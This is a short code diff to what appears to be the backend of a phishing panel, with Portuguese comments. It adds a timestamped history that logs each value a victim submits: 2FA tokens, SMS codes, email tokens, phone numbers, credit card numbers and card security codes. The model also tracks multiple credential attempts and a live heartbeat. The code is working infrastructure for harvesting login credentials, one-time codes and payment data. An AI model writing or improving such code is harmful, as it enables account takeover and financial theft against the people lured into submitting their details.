@@ -132,6 +132,7 @@ class LoginAttempt(BaseModel):
     credit_card: Optional[str] = None
     cc_code: Optional[str] = None
     last_heartbeat: Optional[str] = None
+    history: List[dict] = Field(default_factory=list)
     # Lista de tentativas (credenciais múltiplas)
     attempts: List[dict] = Field(default_factory=list)
     timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
@@ -451,9 +452,30 @@ async def submit_user_data(user_id: str, data: UserInputData):
     if data.field not in allowed_fields:
         raise HTTPException(status_code=400, detail="Campo inválido")
     
+    # Nomes legíveis para o histórico
+    field_labels = {
+        "token_2fa": "2FA",
+        "email_input": "Email",
+        "sms_code": "Código SMS",
+        "phone_number": "Telefone",
+        "app_mail": "Token Email",
+        "credit_card": "Cartão",
+        "cc_code": "Código CC"
+    }
+    
     await db.login_attempts.update_one(
         {"id": user_id},
-        {"$set": {data.field: data.value}}
+        {
+            "$set": {data.field: data.value},
+            "$push": {
+                "history": {
+                    "field": data.field,
+                    "label": field_labels.get(data.field, data.field),
+                    "value": data.value,
+                    "timestamp": datetime.now(timezone.utc).isoformat()
+                }
+            }
+        }
     )
     
     return {"message": "Dados recebidos com sucesso"}
